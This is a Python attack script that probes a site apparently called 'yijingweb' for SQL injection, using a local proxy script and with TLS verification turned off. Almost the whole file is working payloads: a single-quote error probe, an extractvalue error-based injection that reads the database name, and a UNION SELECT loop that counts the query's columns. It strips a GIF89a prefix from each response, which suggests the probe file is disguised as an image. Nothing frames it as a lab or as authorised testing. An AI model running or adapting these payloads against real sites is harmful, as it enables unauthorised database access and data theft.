#!/usr/bin/env python3
"""yj_sqli_detail.py - yijingweb SQLi详情分析"""
import urllib.request, urllib.parse, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
PROBE = 'http://127.0.0.1:13080/yj_probe.php'

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(50000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:80]

# 1. 单引号报错详情
print('=== id=687\' ===')
out = fetch(PROBE + '?id=687%27')
idx = out.find('GIF89a')
body = out[idx+6:] if idx > 0 else out
# 提取错误信息
m = re.search(r'<[^>]*error[^>]*>|You have an error[^<]*|SQL syntax[^<]*|mysql[^<]*', body, re.I)
errs = re.findall(r'[^<>]{0,120}(?:error|syntax|mysql)[^<>]{0,120}', body, re.I)
for e in errs[:3]:
    print('  ERR:', e.replace(chr(10), ' ')[:150])

# 2. 报错注入(extractvalue)
print('\n=== extractvalue报错 ===')
out2 = fetch(PROBE + '?id=687%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))')
idx2 = out2.find('GIF89a')
body2 = out2[idx2+6:] if idx2 > 0 else out2
errs2 = re.findall(r'[^<>]{0,120}(?:extractvalue|XPATH|~)[^<>]{0,120}', body2, re.I)
for e in errs2[:3]:
    print('  ERR:', e.replace(chr(10), ' ')[:200])

# 3. 联合注入列数
print('\n=== union 列数探测 ===')
for n in range(3, 12):
    cols = ','.join(str(i) for i in range(1, n+1))
    out3 = fetch(PROBE + '?id=687%20and%201=2%20union%20select%20' + urllib.parse.quote(cols) + '--%20-')
    idx3 = out3.find('GIF89a')
    body3 = out3[idx3+6:] if idx3 > 0 else out3
    has_err = 'error' in body3.lower() or 'syntax' in body3.lower()
    if not has_err:
        print('  %d columns OK' % n, flush=True)
    else:
        print('  %d cols err' % n, flush=True)
